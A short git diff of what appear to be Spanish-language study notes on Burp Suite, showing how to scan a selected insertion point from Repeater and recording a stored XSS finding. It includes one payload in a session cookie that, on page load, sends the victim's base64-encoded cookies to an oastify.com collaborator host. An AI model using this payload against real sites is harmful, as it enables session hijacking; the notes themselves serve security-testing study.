@@ -9,4 +9,16 @@
 
 ---
 
+- Para analizar solo una parte de informacion, nos mandamos la solicitud al Repeater y, seleccionando la parte a analizar, le damos a 'Scan Selected Insertion Point':
+
 ![[Pasted image 20260804172835.png|423]]
+
+- En este caso nos saca un Stored XSS: ![[Pasted image 20260805140340.png|678]]
+
+```
+Cookie: session='"><svg/onload=fetch(`//uqonq5sg8gzjqxtugg01eksogfm6ayyn\.oastify.com/${btoa(document.cookie)}`)>:Q0o5SNv8KmbxZMesV1ZclzQ3sqJXLpiP
+```
+
+![[Pasted image 20260805140829.png]]
+
+![[Pasted image 20260805140848.png]]
